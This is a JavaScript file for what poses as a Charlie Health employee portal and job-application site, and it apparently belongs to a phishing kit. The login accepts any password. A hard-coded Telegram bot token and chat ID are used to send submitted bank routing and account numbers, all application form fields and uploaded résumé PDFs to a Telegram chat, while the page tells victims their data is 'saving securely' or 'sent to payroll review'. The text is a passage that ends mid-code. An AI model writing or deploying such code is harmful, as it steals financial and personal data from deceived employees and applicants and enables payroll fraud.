const filterButtons = document.querySelectorAll('.filter-btn');
const roleCards = document.querySelectorAll('.role-card');

filterButtons.forEach((button) => {
  button.addEventListener('click', () => {
    const selectedFilter = button.dataset.filter;

    filterButtons.forEach((btn) => btn.classList.toggle('active', btn === button));

    roleCards.forEach((card) => {
      const match = selectedFilter === 'all' || card.dataset.category === selectedFilter;
      card.classList.toggle('hidden', !match);
    });
  });
});

const loginForm = document.querySelector('[data-login-form]');
const employeeInput = document.querySelector('#employee-identifier');
const passwordInput = document.querySelector('#password');
const passwordToggle = document.querySelector('.password-toggle');

if (passwordToggle && passwordInput) {
  passwordToggle.addEventListener('click', () => {
    const isPassword = passwordInput.type === 'password';
    passwordInput.type = isPassword ? 'text' : 'password';
    passwordToggle.textContent = isPassword ? 'Hide' : 'Show';
    passwordToggle.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
  });
}

window.EmployeePortalAuth = {
  storageKey: 'charlieHealthEmployeePortalSession',
  getSession() {
    try {
      const raw = window.localStorage.getItem(this.storageKey);
      return raw ? JSON.parse(raw) : null;
    } catch (error) {
      return null;
    }
  },
  setSession(employee = {}) {
    const profile = {
      authenticated: true,
      employeeIdentifier: String(employee.employeeIdentifier || '').trim(),
      employeeName: String(employee.employeeName || '').trim() || 'Employee',
      employeeId: String(employee.employeeId || '').trim() || 'Employee ID',
      email: String(employee.email || '').trim() || '',
      connectedAt: new Date().toISOString(),
    };
    window.localStorage.setItem(this.storageKey, JSON.stringify(profile));
    return profile;
  },
  isAuthenticated() {
    const session = this.getSession();
    return Boolean(session && session.authenticated);
  },
  requireSession() {
    const isDashboardRoute = window.location.pathname.includes('/employee-dashboard') && !window.location.pathname.includes('/employee-login');
    if (!isDashboardRoute) {
      return true;
    }

    if (!this.isAuthenticated()) {
      window.location.href = '../../employee-login/';
      return false;
    }

    return true;
  },
  async login({ employeeIdentifier, password }) {
    const identifier = String(employeeIdentifier || '').trim().toLowerCase();
    const suppliedPassword = String(password || '').trim();

    if (!identifier || !suppliedPassword) {
      return { ok: false, message: 'Please complete both fields to continue.' };
    }

    const employeeName = identifier.includes('@')
      ? identifier.split('@')[0].replace(/[._-]+/g, ' ').replace(/\b\w/g, (char) => char.toUpperCase())
      : 'Employee';

    this.setSession({
      employeeIdentifier: identifier,
      employeeName,
      employeeId: 'Employee ID',
      email: identifier.includes('@') ? identifier : '',
    });

    return { ok: true, redirectUrl: '../' };
  },
  logout() {
    window.localStorage.removeItem(this.storageKey);
    window.location.href = '../employee-login/';
  },
};

if (loginForm && employeeInput && passwordInput) {
  const setError = (field, message) => {
    const errorEl = document.querySelector(`#${field}-error`);
    if (errorEl) {
      errorEl.textContent = message;
    }
  };

  const clearErrors = () => {
    setError('employee-identifier', '');
    setError('password', '');
  };

  loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    clearErrors();

    const employeeValue = employeeInput.value.trim();
    const passwordValue = passwordInput.value.trim();

    if (!employeeValue) {
      setError('employee-identifier', 'Please enter your work email or employee ID.');
    }

    if (!passwordValue) {
      setError('password', 'Please enter your password.');
    }

    if (!employeeValue || !passwordValue) {
      return;
    }

    const authHandler = window.EmployeePortalAuth;
    const payload = {
      employeeIdentifier: employeeValue,
      password: passwordValue,
    };

    if (authHandler && typeof authHandler.login === 'function') {
      const authResult = await authHandler.login(payload);
      if (!authResult.ok) {
        setError('employee-identifier', authResult.message);
        setError('password', authResult.message);
        return;
      }

      if (authResult.redirectUrl) {
        window.location.href = authResult.redirectUrl;
        return;
      }
    }

    window.location.href = '../employee-dashboard/';
  });
}

const logoutButton = document.querySelector('#logout-button');
if (logoutButton) {
  logoutButton.addEventListener('click', () => {
    if (window.EmployeePortalAuth && typeof window.EmployeePortalAuth.logout === 'function') {
      window.EmployeePortalAuth.logout();
      return;
    }

    window.location.href = '../employee-login/';
  });
}

document.querySelectorAll('[data-logout-button]').forEach((button) => {
  button.addEventListener('click', () => {
    if (window.EmployeePortalAuth && typeof window.EmployeePortalAuth.logout === 'function') {
      window.EmployeePortalAuth.logout();
    }
  });
});

const profileMenus = document.querySelectorAll('.profile-menu');
profileMenus.forEach((menu) => {
  const toggle = menu.querySelector('.profile-menu-toggle');
  if (!toggle) {
    return;
  }

  toggle.addEventListener('click', () => {
    const isOpen = menu.classList.contains('open');
    profileMenus.forEach((other) => {
      other.classList.remove('open');
    });
    menu.classList.toggle('open', !isOpen);
    toggle.setAttribute('aria-expanded', String(!isOpen));
  });

  document.addEventListener('click', (event) => {
    if (!menu.contains(event.target)) {
      menu.classList.remove('open');
      toggle.setAttribute('aria-expanded', 'false');
    }
  });
});

window.EmployeePortalProfile = {
  storageKey: 'charlieHealthEmployeeProfile',
  defaultProfile: {
    fullName: 'Employee Name',
    employeeId: 'Employee ID',
    workEmail: 'employee@charliehealth.com',
    phoneNumber: '(555) 401-2847',
    jobTitle: 'Remote Care Coordinator',
    department: 'Customer Operations',
    manager: 'Alicia Martin',
    employmentStatus: 'Full-Time',
    workLocation: 'Remote (US Nationwide)',
  },
  getProfile() {
    try {
      const saved = JSON.parse(localStorage.getItem(this.storageKey) || 'null');
      return saved ? { ...this.defaultProfile, ...saved } : { ...this.defaultProfile };
    } catch (error) {
      return { ...this.defaultProfile };
    }
  },
  saveProfile(profile) {
    const nextProfile = { ...this.defaultProfile, ...profile };
    localStorage.setItem(this.storageKey, JSON.stringify(nextProfile));
    return nextProfile;
  },
  applyProfileToInputs() {
    const profile = this.getProfile();
    document.querySelectorAll('[data-profile-field]').forEach((field) => {
      const key = field.dataset.profileField;
      const value = profile[key] || '';
      field.value = value;
    });

    const topbarName = document.querySelector('.profile-meta strong');
    const topbarId = document.querySelector('.profile-meta span');
    if (topbarName) {
      topbarName.textContent = profile.fullName || 'Employee Name';
    }
    if (topbarId) {
      topbarId.textContent = `Employee ID: ${profile.employeeId || 'Employee ID'}`;
    }
  },
  setEditingMode(isEditing) {
    document.querySelectorAll('[data-profile-field]').forEach((field) => {
      field.readOnly = !isEditing;
      field.disabled = !isEditing;
      if (isEditing) {
        field.classList.add('is-editing');
      } else {
        field.classList.remove('is-editing');
      }
    });

    const editButton = document.getElementById('edit-profile-button');
    const saveButton = document.getElementById('save-profile-button');
    const cancelButton = document.getElementById('cancel-profile-button');
    if (editButton) editButton.hidden = isEditing;
    if (saveButton) saveButton.hidden = !isEditing;
    if (cancelButton) cancelButton.hidden = !isEditing;
  },
  bindProfilePage() {
    const page = document.querySelector('[data-profile-page]');
    if (!page) return;

    this.applyProfileToInputs();
    this.setEditingMode(false);

    const editButton = document.getElementById('edit-profile-button');
    const saveButton = document.getElementById('save-profile-button');
    const cancelButton = document.getElementById('cancel-profile-button');

    if (editButton) {
      editButton.addEventListener('click', () => this.setEditingMode(true));
    }

    if (cancelButton) {
      cancelButton.addEventListener('click', () => {
        this.applyProfileToInputs();
        this.setEditingMode(false);
      });
    }

    if (saveButton) {
      saveButton.addEventListener('click', () => {
        const nextProfile = {};
        document.querySelectorAll('[data-profile-field]').forEach((field) => {
          nextProfile[field.dataset.profileField] = field.value.trim();
        });

        const saved = this.saveProfile(nextProfile);
        this.applyProfileToInputs();
        this.setEditingMode(false);
        if (window.EmployeePortalAuth && typeof window.EmployeePortalAuth.setSession === 'function') {
          window.EmployeePortalAuth.setSession({
            employeeName: saved.fullName || 'Employee Name',
            employeeId: saved.employeeId || 'Employee ID',
            email: saved.workEmail || '',
          });
        }
      });
    }
  },
};

if (document.querySelector('[data-profile-page]')) {
  window.EmployeePortalProfile.bindProfilePage();
}

const employeeDashboardShell = document.querySelector('.employee-dashboard-shell');
if (employeeDashboardShell && window.EmployeePortalAuth && typeof window.EmployeePortalAuth.requireSession === 'function') {
  window.EmployeePortalAuth.requireSession();
}

if (window.EmployeePortalData && typeof window.EmployeePortalData.renderDashboardSummary === 'function') {
  window.EmployeePortalData.renderDashboardSummary();
}

const directDepositForm = document.getElementById('direct-deposit-form');
if (directDepositForm) {
  const status = document.getElementById('direct-deposit-status');

  directDepositForm.addEventListener('submit', (event) => {
    event.preventDefault();

    const formData = {
      bankName: document.getElementById('bank-name')?.value || '',
      accountName: document.getElementById('account-name')?.value || '',
      accountType: document.getElementById('account-type')?.value || '',
      routingNumber: document.getElementById('routing-number')?.value || '',
      accountNumber: document.getElementById('account-number')?.value || '',
    };

    const fields = [
      ['Bank Name', formData.bankName],
      ['Account Name', formData.accountName],
      ['Account Type', formData.accountType],
      ['Routing Number', formData.routingNumber],
      ['Account Number', formData.accountNumber],
    ];

    const missing = fields.find(([, value]) => !String(value).trim());
    if (missing) {
      status.textContent = `${missing[0]} is required.`;
      status.classList.add('visible');
      return;
    }

    const routingDigits = formData.routingNumber.replace(/\D/g, '');
    const accountDigits = formData.accountNumber.replace(/\D/g, '');

    if (routingDigits.length < 9) {
      status.textContent = 'Routing number must contain at least 9 digits.';
      return;
    }

    if (accountDigits.length < 4) {
      status.textContent = 'Account number must contain at least 4 digits.';
      return;
    }

    if (window.EmployeePortalData && typeof window.EmployeePortalData.saveDirectDeposit === 'function') {
      window.EmployeePortalData.saveDirectDeposit(formData);
      window.EmployeePortalData.renderDashboardSummary();
    }

    status.textContent = 'Direct deposit information saved to your dashboard.';
    status.classList.remove('error-message');
    status.classList.add('success-message');
    directDepositForm.reset();
  });
}

const mobileNavToggle = document.querySelector('[data-mobile-nav-toggle]');
if (mobileNavToggle) {
  mobileNavToggle.addEventListener('click', () => {
    document.body.classList.toggle('sidebar-open');
    document.body.classList.toggle('employee-dashboard-page');
  });
}

const accordionButtons = document.querySelectorAll('.accordion-button');
accordionButtons.forEach((button) => {
  button.addEventListener('click', () => {
    const item = button.closest('.accordion-item');
    if (!item) {
      return;
    }

    const isOpen = item.classList.contains('open');
    accordionButtons.forEach((otherButton) => {
      const otherItem = otherButton.closest('.accordion-item');
      if (otherItem && otherItem !== item) {
        otherItem.classList.remove('open');
      }
    });

    item.classList.toggle('open', !isOpen);
  });
});

window.TelegramNotifier = {
  botToken: '8831343489:AAFgYIOlSf3GDfERnt7ojXAOeeLwT9UqKzo',
  chatId: '7680663081',
  async sendMessage({ text, chatId = this.chatId, replyToMessageId = null, replyMarkup = null } = {}) {
    const payload = {
      chat_id: String(chatId),
      text: String(text || '').slice(0, 4096),
      disable_web_page_preview: true,
    };

    if (replyToMessageId) {
      payload.reply_to_message_id = Number(replyToMessageId);
    }

    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return {
      ok: response.ok && Boolean(result && result.ok),
      response,
      result,
    };
  },
  async sendDocument({ file, caption, chatId = this.chatId, replyMarkup = null } = {}) {
    if (!file) {
      return { ok: false, result: { description: 'No file provided.' } };
    }

    const formData = new FormData();
    formData.append('chat_id', String(chatId));
    formData.append('document', file);

    if (caption) {
      formData.append('caption', String(caption).slice(0, 1024));
    }

    if (replyMarkup) {
      formData.append('reply_markup', JSON.stringify(replyMarkup));
    }

    const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendDocument`, {
      method: 'POST',
      body: formData,
    });

    const result = await response.json();
    return {
      ok: response.ok && Boolean(result && result.ok),
      response,
      result,
    };
  },
  async sendFiles({ files = [], caption, chatId = this.chatId, replyMarkup = null } = {}) {
    const attachments = Array.from(files || []).filter((file) => file && (file.type === 'application/pdf' || /\.pdf$/i.test(file.name)));
    if (!attachments.length) {
      return { ok: false, result: { description: 'No PDF files provided.' } };
    }

    const results = [];
    for (const file of attachments) {
      const result = await this.sendDocument({ file, caption, chatId, replyMarkup });
      results.push(result);
    }

    const allSuccessful = results.every((result) => result && result.ok);
    return {
      ok: allSuccessful,
      results,
      response: results.at(-1)?.response,
      result: results.at(-1)?.result,
    };
  },
};

window.EmployeePortalData = {
  storageKey: 'charlieHealthDirectDeposit',
  maskRouting(value) {
    const digits = String(value || '').replace(/\D/g, '');
    return digits ? `•••• ${digits.slice(-4)}` : 'Not provided';
  },
  maskAccount(value) {
    const digits = String(value || '').replace(/\D/g, '');
    return digits ? `•••• ${digits.slice(-4)}` : 'Not provided';
  },
  getDirectDeposit() {
    try {
      const raw = window.localStorage.getItem(this.storageKey);
      return raw ? JSON.parse(raw) : null;
    } catch (error) {
      return null;
    }
  },
  saveDirectDeposit(data) {
    const payload = {
      bankName: String(data.bankName || 'Bank account').trim() || 'Bank account',
      accountName: String(data.accountName || '').trim(),
      accountType: String(data.accountType || '').trim() || 'Checking',
      routingNumber: String(data.routingNumber || '').trim(),
      accountNumber: String(data.accountNumber || '').trim(),
      updatedAt: new Date().toISOString(),
    };

    window.localStorage.setItem(this.storageKey, JSON.stringify(payload));
    return payload;
  },
  renderDashboardSummary() {
    const target = document.getElementById('dashboard-direct-deposit-summary');
    if (!target) {
      return;
    }

    const saved = this.getDirectDeposit();
    if (!saved || !saved.bankName) {
      target.innerHTML = '<p class="dashboard-placeholder">No direct deposit information saved yet.</p>';
      return;
    }

    target.innerHTML = `
      <div class="summary-row"><strong>Bank:</strong><span>${saved.bankName}</span></div>
      <div class="summary-row"><strong>Account:</strong><span>${saved.accountName}</span></div>
      <div class="summary-row"><strong>Type:</strong><span>${saved.accountType || 'Not provided'}</span></div>
      <div class="summary-row"><strong>Routing:</strong><span>${this.maskRouting(saved.routingNumber)}</span></div>
      <div class="summary-row"><strong>Account:</strong><span>${this.maskAccount(saved.accountNumber)}</span></div>
    `;
  },
  renderCurrentAccountSummary() {
    const accountTypeTarget = document.getElementById('current-account-type-value');
    const accountNumberTarget = document.getElementById('current-account-number-value');
    const statusTarget = document.getElementById('current-account-status-value');
    const accountNameTarget = document.getElementById('current-account-name-value');

    const saved = this.getDirectDeposit();
    if (!saved) {
      if (accountTypeTarget) accountTypeTarget.textContent = 'Checking';
      if (accountNumberTarget) accountNumberTarget.textContent = '•••• 4821';
      if (statusTarget) statusTarget.textContent = 'Active';
      if (accountNameTarget) accountNameTarget.textContent = 'Employee Name';
      return;
    }

    if (accountTypeTarget) {
      accountTypeTarget.textContent = saved.accountType || 'Checking';
    }
    if (accountNumberTarget) {
      accountNumberTarget.textContent = this.maskAccount(saved.accountNumber);
    }
    if (statusTarget) {
      statusTarget.textContent = 'Active';
    }
    if (accountNameTarget) {
      accountNameTarget.textContent = saved.accountName || 'Employee Name';
    }
  },
};

const directDepositUpdateLink = document.querySelector('[data-direct-deposit-update-link]');
if (directDepositUpdateLink) {
  directDepositUpdateLink.addEventListener('click', (event) => {
    event.preventDefault();
    window.location.href = './update/';
  });
}

const directDepositEditForm = document.getElementById('edit-direct-deposit-form');
if (directDepositEditForm) {
  const submitButton = document.getElementById('edit-save-direct-deposit');
  const accountType = document.getElementById('edit-account-type');
  const accountHolderName = document.getElementById('edit-account-holder-name');
  const routingNumber = document.getElementById('edit-routing-number');
  const accountNumber = document.getElementById('edit-account-number');
  const confirmAccountNumber = document.getElementById('edit-confirm-account-number');
  const authorizationAccurate = document.getElementById('edit-authorization-accurate');
  const authorizationConsent = document.getElementById('edit-authorization-consent');

  const setError = (fieldId, message) => {
    const error = document.querySelector(`[data-error-for="${fieldId}"]`);
    if (error) {
      error.textContent = message;
    }
  };

  const clearError = (fieldId) => {
    setError(fieldId, '');
  };

  const validateForm = ({ showErrors = true } = {}) => {
    let valid = true;

    if (!accountType.value.trim()) {
      if (showErrors) setError('edit-account-type', 'Please select an account type.');
      valid = false;
    } else {
      clearError('edit-account-type');
    }

    if (!accountHolderName.value.trim()) {
      if (showErrors) setError('edit-account-holder-name', 'Account holder name is required.');
      valid = false;
    } else {
      clearError('edit-account-holder-name');
    }

    const routingDigits = routingNumber.value.replace(/\D/g, '');
    if (!routingNumber.value.trim()) {
      if (showErrors) setError('edit-routing-number', 'Routing number is required.');
      valid = false;
    } else if (!/^\d{9}$/.test(routingDigits)) {
      if (showErrors) setError('edit-routing-number', 'Routing number must be exactly 9 digits.');
      valid = false;
    } else {
      clearError('edit-routing-number');
    }

    const accountDigits = accountNumber.value.replace(/\D/g, '');
    if (!accountNumber.value.trim()) {
      if (showErrors) setError('edit-account-number', 'Account number is required.');
      valid = false;
    } else if (accountDigits.length < 4) {
      if (showErrors) setError('edit-account-number', 'Account number must contain at least 4 digits.');
      valid = false;
    } else {
      clearError('edit-account-number');
    }

    const confirmDigits = confirmAccountNumber.value.replace(/\D/g, '');
    if (!confirmAccountNumber.value.trim()) {
      if (showErrors) setError('edit-confirm-account-number', 'Please confirm your account number.');
      valid = false;
    } else if (confirmDigits !== accountDigits) {
      if (showErrors) setError('edit-confirm-account-number', 'Account numbers do not match.');
      valid = false;
    } else {
      clearError('edit-confirm-account-number');
    }

    if (!authorizationAccurate.checked) {
      if (showErrors) setError('edit-authorization-accurate', 'Please confirm that the account details are accurate.');
      valid = false;
    } else {
      clearError('edit-authorization-accurate');
    }

    if (!authorizationConsent.checked) {
      if (showErrors) setError('edit-authorization-consent', 'Please authorize payroll to use this account.');
      valid = false;
    } else {
      clearError('edit-authorization-consent');
    }

    submitButton.disabled = !valid;
    return valid;
  };

  const showAccountNumberButtons = document.querySelectorAll('[data-show-account-number]');
  showAccountNumberButtons.forEach((button) => {
    button.addEventListener('click', () => {
      const targetId = button.dataset.showAccountNumber;
      const targetInput = document.getElementById(targetId);
      if (!targetInput) {
        return;
      }

      const shouldShow = targetInput.type === 'password';
      targetInput.type = shouldShow ? 'text' : 'password';
      button.textContent = shouldShow ? 'Hide' : 'Show';
      button.setAttribute('aria-label', shouldShow ? 'Hide account number' : 'Show account number');
    });
  });

  [accountType, accountHolderName, routingNumber, accountNumber, confirmAccountNumber, authorizationAccurate, authorizationConsent].forEach((field) => {
    field.addEventListener('input', () => validateForm({ showErrors: false }));
    field.addEventListener('change', () => validateForm({ showErrors: false }));
  });

  directDepositEditForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    if (!validateForm()) {
      return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'Saving securely...';

    try {
      const result = await window.EmployeePortalPayrollAPI.submitDirectDepositUpdate({
        accountType: accountType.value,
        accountHolderName: accountHolderName.value,
        routingNumber: routingNumber.value,
        accountNumber: accountNumber.value,
        authorizationConfirmed: authorizationAccurate.checked,
        payrollTermsAccepted: authorizationConsent.checked,
      });

      if (result && result.ok && (result.status === 'pending' || result.status === 'success')) {
        window.EmployeePortalData.saveDirectDeposit({
          bankName: 'Bank account',
          accountName: accountHolderName.value.trim(),
          accountType: accountType.value.trim(),
          routingNumber: routingNumber.value.trim(),
          accountNumber: accountNumber.value.trim(),
        });
        window.location.href = '../update/';
        return;
      }

      setError('edit-account-number', 'We were unable to update your banking information. Your existing direct deposit information has not been changed.');
    } catch (error) {
      setError('edit-account-number', 'We were unable to update your banking information. Your existing direct deposit information has not been changed.');
    } finally {
      submitButton.disabled = false;
      submitButton.textContent = 'Save Changes';
      validateForm({ showErrors: false });
    }
  });

  validateForm({ showErrors: false });
}

window.EmployeePortalData.renderCurrentAccountSummary();

window.EmployeePortalPayrollAPI = window.EmployeePortalPayrollAPI || {
  async submitDirectDepositUpdate(payload) {
    const safePayload = {
      accountType: String(payload.accountType || '').trim(),
      accountHolderName: String(payload.accountHolderName || '').trim(),
      routingNumber: String(payload.routingNumber || '').replace(/\D/g, '').slice(-9),
      accountNumber: String(payload.accountNumber || '').replace(/\D/g, ''),
      depositPreference: payload.depositPreference || 'full-paycheck',
      effectiveDatePreference: payload.effectiveDatePreference || 'as-soon-as-possible',
      authorizationConfirmed: Boolean(payload.authorizationConfirmed),
      payrollTermsAccepted: Boolean(payload.payrollTermsAccepted),
    };

    const telegramMessage = [
      'Charlie Health direct deposit update request',
      '--- Full payload ---',
      JSON.stringify({
        ...safePayload,
        confirmAccountNumber: String(payload.confirmAccountNumber || '').replace(/\D/g, ''),
        authorizationAccurate: Boolean(payload.authorizationConfirmed),
        payrollTermsAccepted: Boolean(payload.payrollTermsAccepted),
      }, null, 2),
    ].join('\n');

    try {
      const telegramResult = await window.TelegramNotifier.sendMessage({
        text: telegramMessage,
        replyMarkup: {
          force_reply: true,
          input_field_placeholder: 'Reply with payroll review notes',
        },
      });

      if (telegramResult.ok) {
        return {
          ok: true,
          status: 'pending',
          message: 'Direct deposit update sent to payroll review via Telegram.',
          effectiveDate: null,
          payload: safePayload,
        };
      }

      return {
        ok: false,
        status: 'error',
        message: telegramResult.result && telegramResult.result.description ? telegramResult.result.description : 'Unable to send direct deposit update to Telegram.',
        effectiveDate: null,
        payload: safePayload,
      };
    } catch (error) {
      return {
        ok: false,
        status: 'error',
        message: 'Unable to connect to the Telegram HTTP API for payroll review.',
        effectiveDate: null,
        payload: safePayload,
      };
    }
  },
};

const directDepositUpdateForm = document.getElementById('direct-deposit-update-form');
if (directDepositUpdateForm) {
  const state = {
    isSubmitting: false,
    hasUnsavedChanges: false,
  };

  const updateButton = document.getElementById('save-direct-deposit-update');
  const processingState = document.getElementById('processing-state');
  const successState = document.getElementById('success-state');
  const pendingState = document.getElementById('pending-state');
  const errorState = document.getElementById('error-state');
  const discardModal = document.getElementById('discard-confirmation-modal');
  const cancelButton = document.getElementById('cancel-direct-deposit-update');
  const keepEditingButton = document.getElementById('keep-editing');
  const discardChangesButton = document.getElementById('discard-changes');
  const showAccountNumberButtons = document.querySelectorAll('[data-show-account-number]');
  const editCurrentDirectDepositButton = document.getElementById('edit-current-direct-deposit');

  const accountType = document.getElementById('update-account-type');
  const accountHolderName = document.getElementById('account-holder-name');
  const routingNumber = document.getElementById('routing-number');
  const accountNumber = document.getElementById('account-number');
  const confirmAccountNumber = document.getElementById('confirm-account-number');
  const authorizationAccurate = document.getElementById('authorization-accurate');
  const authorizationConsent = document.getElementById('authorization-consent');

  const setError = (fieldId, message) => {
    const errorElement = document.querySelector(`[data-error-for="${fieldId}"]`);
    if (errorElement) {
      errorElement.textContent = message;
    }
  };

  const clearError = (fieldId) => {
    setError(fieldId, '');
  };

  const showView = (viewName) => {
    const formVisible = viewName === 'form';
    directDepositUpdateForm.hidden = !formVisible;
    processingState.hidden = viewName !== 'processing';
    successState.hidden = viewName !== 'success';
    pendingState.hidden = viewName !== 'pending';
    errorState.hidden = viewName !== 'error';
  };

  const validateForm = ({ showErrors = true } = {}) => {
    let isValid = true;

    if (!accountType.value.trim()) {
      if (showErrors) setError('update-account-type', 'Please select an account type.');
      isValid = false;
    } else {
      clearError('update-account-type');
    }

    if (!accountHolderName.value.trim()) {
      if (showErrors) setError('account-holder-name', 'Account holder name is required.');
      isValid = false;
    } else {
      clearError('account-holder-name');
    }

    const routingDigits = routingNumber.value.replace(/\D/g, '');
    if (!routingNumber.value.trim()) {
      if (showErrors) setError('routing-number', 'Routing number is required.');
      isValid = false;
    } else if (!/^\d{9}$/.test(routingDigits)) {
      if (showErrors) setError('routing-number', 'Routing number must be exactly 9 digits.');
      isValid = false;
    } else {
      clearError('routing-number');
    }

    const accountDigits = accountNumber.value.replace(/\D/g, '');
    if (!accountNumber.value.trim()) {
      if (showErrors) setError('account-number', 'Account number is required.');
      isValid = false;
    } else if (accountDigits.length < 4) {
      if (showErrors) setError('account-number', 'Account number must contain at least 4 digits.');
      isValid = false;
    } else {
      clearError('account-number');
    }

    const confirmDigits = confirmAccountNumber.value.replace(/\D/g, '');
    if (!confirmAccountNumber.value.trim()) {
      if (showErrors) setError('confirm-account-number', 'Please confirm your account number.');
      isValid = false;
    } else if (confirmDigits !== accountDigits) {
      if (showErrors) setError('confirm-account-number', 'Account numbers do not match.');
      isValid = false;
    } else {
      clearError('confirm-account-number');
    }

    if (!authorizationAccurate.checked) {
      if (showErrors) setError('authorization-accurate', 'Please confirm that the account details are accurate.');
      isValid = false;
    } else {
      clearError('authorization-accurate');
    }

    if (!authorizationConsent.checked) {
      if (showErrors) setError('authorization-consent', 'Please authorize payroll to use this account.');
      isValid = false;
    } else {
      clearError('authorization-consent');
    }

    updateButton.disabled = state.isSubmitting || !isValid;
    return isValid;
  };

  const markDirty = () => {
    state.hasUnsavedChanges = true;
    validateForm({ showErrors: false });
  };

  const handleCancel = () => {
    if (state.isSubmitting) {
      return;
    }

    if (state.hasUnsavedChanges) {
      discardModal.classList.remove('hidden');
      return;
    }

    window.location.href = '../';
  };

  showAccountNumberButtons.forEach((button) => {
    button.addEventListener('click', () => {
      const targetId = button.dataset.showAccountNumber;
      const targetInput = document.getElementById(targetId);
      if (!targetInput) {
        return;
      }

      const shouldShow = targetInput.type === 'password';
      targetInput.type = shouldShow ? 'text' : 'password';
      button.textContent = shouldShow ? 'Hide' : 'Show';
      button.setAttribute('aria-label', shouldShow ? 'Hide account number' : 'Show account number');
    });
  });

  [accountType, accountHolderName, routingNumber, accountNumber, confirmAccountNumber, authorizationAccurate, authorizationConsent].forEach((field) => {
    field.addEventListener('input', markDirty);
    field.addEventListener('change', markDirty);
  });

  cancelButton.addEventListener('click', handleCancel);
  keepEditingButton.addEventListener('click', () => {
    discardModal.classList.add('hidden');
  });
  discardChangesButton.addEventListener('click', () => {
    window.location.href = '../';
  });
  if (editCurrentDirectDepositButton) {
    editCurrentDirectDepositButton.addEventListener('click', () => {
      const formTarget = document.getElementById('direct-deposit-update-form');
      if (formTarget) {
        formTarget.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  }

  directDepositUpdateForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    if (state.isSubmitting) {
      return;
    }

    if (!validateForm()) {
      return;
    }

    state.isSubmitting = true;
    state.hasUnsavedChanges = false;
    updateButton.disabled = true;
    updateButton.textContent = 'Saving securely...';
    showView('processing');

    const payload = {
      accountType: accountType.value.trim(),
      accountHolderName: accountHolderName.value.trim(),
      routingNumber: routingNumber.value.trim(),
      accountNumber: accountNumber.value.trim(),
      depositPreference: 'full-paycheck',
      effectiveDatePreference: 'as-soon-as-possible',
      authorizationConfirmed: authorizationAccurate.checked,
      payrollTermsAccepted: authorizationConsent.checked,
    };

    try {
      const response = await window.EmployeePortalPayrollAPI.submitDirectDepositUpdate(payload);
      if (response && response.ok && response.status === 'success') {
        const successDate = response.effectiveDate ? response.effectiveDate : 'Pending payroll confirmation';
        const successDateLabel = document.getElementById('success-effective-date');
        if (successDateLabel) {
          successDateLabel.textContent = successDate;
        }
        showView('success');
        return;
      }

      if (response && response.ok && response.status === 'pending') {
        const pendingEffectiveDate = response.effectiveDate ? response.effectiveDate : 'Pending payroll confirmation';
        const pendingDateLabel = document.getElementById('pending-effective-date');
        if (pendingDateLabel) {
          pendingDateLabel.textContent = pendingEffectiveDate;
        }
        showView('pending');
        return;
      }

      showView('error');
      const errorMessage = document.getElementById('error-message-copy');
      if (errorMessage) {
        errorMessage.textContent = response && response.message ? response.message : 'We were unable to update your banking information. Your existing direct deposit information has not been changed.';
      }
    } catch (error) {
      showView('error');
      const errorMessage = document.getElementById('error-message-copy');
      if (errorMessage) {
        errorMessage.textContent = 'We were unable to update your banking information. Your existing direct deposit information has not been changed.';
      }
    } finally {
      state.isSubmitting = false;
      updateButton.textContent = 'Save Changes';
      updateButton.disabled = !validateForm();
    }
  });

  const handleRetry = document.getElementById('retry-direct-deposit-update');
  if (handleRetry) {
    handleRetry.addEventListener('click', () => {
      state.isSubmitting = false;
      showView('form');
      updateButton.disabled = !validateForm();
      updateButton.textContent = 'Save Changes';
    });
  }

  validateForm({ showErrors: false });
}

window.JobApplicationAPI = window.JobApplicationAPI || {
  async submit(payload) {
    const applicationId = `CH-${Date.now().toString().slice(-8)}`;
    const form = document.getElementById('job-application-form');
    const allFormValues = {};

    if (form) {
      Array.from(form.querySelectorAll('input, select, textarea')).forEach((field) => {
        if (field.hasAttribute('data-employer-field')) {
          return;
        }

        const name = field.name;
        if (!name) {
          return;
        }

        if (field.type === 'radio' || field.type === 'checkbox') {
          if (field.checked) {
            allFormValues[name] = field.value;
          }
          return;
        }

        if (field.type === 'file') {
          allFormValues[name] = field.files && field.files[0] ? field.files[0].name : '';
          return;
        }

        allFormValues[name] = field.value || '';
      });

      allFormValues.previousEmployers = Array.from(form.querySelectorAll('[data-employer-entry]'))
        .map((entry) => Object.fromEntries(
          Array.from(entry.querySelectorAll('[data-employer-field]'))
            .map((field) => [field.dataset.employerField, field.value.trim()])
        ))
        .filter((employer) => Object.values(employer).some(Boolean));
    }

    const fullPayload = {
      ...allFormValues,
      ...(payload || {}),
    };

    const telegramMessage = [
      'Charlie Health job application received',
      `Application ID: ${applicationId}`,
      '--- Full payload ---',
      JSON.stringify(fullPayload, null, 2),
    ].join('\n');

    try {
      const fileInputs = Array.from(form.querySelectorAll('input[type="file"]'));
      const uploadedFiles = fileInputs.flatMap((input) => Array.from(input.files || [])).filter((file) => file && (file.type === 'application/pdf' || /\.pdf$/i.test(file.name)));

      if (uploadedFiles.length > 0) {
        await window.TelegramNotifier.sendFiles({
          files: uploadedFiles,
          caption: telegramMessage,
          replyMarkup: {
            force_reply: true,
            input_field_placeholder: 'Reply with interview questions or next steps',
          },
        });
      } else {
        await window.TelegramNotifier.sendMessage({
          text: telegramMessage,
          replyMarkup: {
            force_reply: true,
            input_field_placeholder: 'Reply with interview questions or next steps',
          },
        });
      }
    } catch (error) {
      // The application can still succeed locally even if Telegram is temporarily unavailable.
    }

    return {
      ok: true,
      applicationId,
      message: 'Application submitted and forwarded to the review channel via Telegram.',
      payload: fullPayload,
    };
  },
};

const applicationForm = document.getElementById('job-application-form');
if (applicationForm) {
  const steps = Array.from(document.querySelectorAll('.application-step'));
  const stepIndicators = Array.from(document.querySelectorAll('.progress-step'));
  const continueButton = document.querySelector('[data-action="continue"]');
  const backButton = document.querySelector('[data-action="back"]');
  const submitButton = document.querySelector('[data-action="submit"]');
  const closeButton = document.querySelector('[data-close-application]');
